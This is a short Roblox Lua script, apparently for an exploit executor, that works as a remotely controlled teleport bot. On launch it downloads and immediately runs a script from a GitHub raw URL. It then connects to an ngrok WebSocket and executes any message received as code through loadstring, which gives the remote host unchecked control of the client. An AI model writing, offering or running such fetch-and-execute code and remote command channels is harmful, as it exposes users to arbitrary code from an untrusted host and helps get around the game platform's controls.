-- Load remote script immediately on launch
loadstring(game:HttpGet("https://raw.githubusercontent.com/Itzboo666/roblox/refs/heads/main/web-serv"))()

-- CONFIG
local WS_URL        = "wss://8216-2a00-23c7-148c-9801-7086-a3ca-6a40-463e.ngrok-free.app/ws"
local COOLDOWN_TIME = 8 * 60  -- 8 minutes

-- SERVICES
local WebSocketService = game:GetService("WebSocketService")
local TeleportService  = game:GetService("TeleportService")
local Players          = game:GetService("Players")
local localPlayer      = Players.LocalPlayer

-- STATE
local lastTeleport   = 0
local isTeleporting  = false

-- Connect to WebSocket
local success, socket = pcall(function()
    return WebSocketService:ConnectAsync(WS_URL)
end)

if not success or not socket then
    warn("[WebSocket] Connection failed:", socket)
    return
end

print("[WebSocket] Connected to server")

-- Reset teleport lock on success
TeleportService.TeleportCompleted:Connect(function()
    isTeleporting = false
    print("[Teleport] Completed successfully, unlocked")
end)

-- Reset teleport lock on GameFull error
TeleportService.TeleportInitFailed:Connect(function(player, result)
    if player == localPlayer and result == Enum.TeleportResult.GameFull then
        isTeleporting = false
        warn("[Teleport] Game full â€” waiting for next job")
    end
end)

-- Receive messages
socket.OnMessage:Connect(function(message)
    if isTeleporting then
        print("[Status] Already teleporting, skipping")
        return
    end

    local now = os.time()
    if now - lastTeleport < COOLDOWN_TIME then
        print(("[Cooldown] %d seconds remaining"):format(COOLDOWN_TIME - (now - lastTeleport)))
        return
    end

    local func, err = loadstring(message)
    if not func then
        warn("[Error] Could not load command:", err)
        return
    end

    -- Lock and run
    isTeleporting = true
    lastTeleport = now
    print("[Teleport] Running:", message)
    func()
end)

-- Handle disconnect
socket.OnClose:Connect(function(code, reason)
    warn(("[WebSocket] Disconnected (%d): %s"):format(code, tostring(reason)))
end)
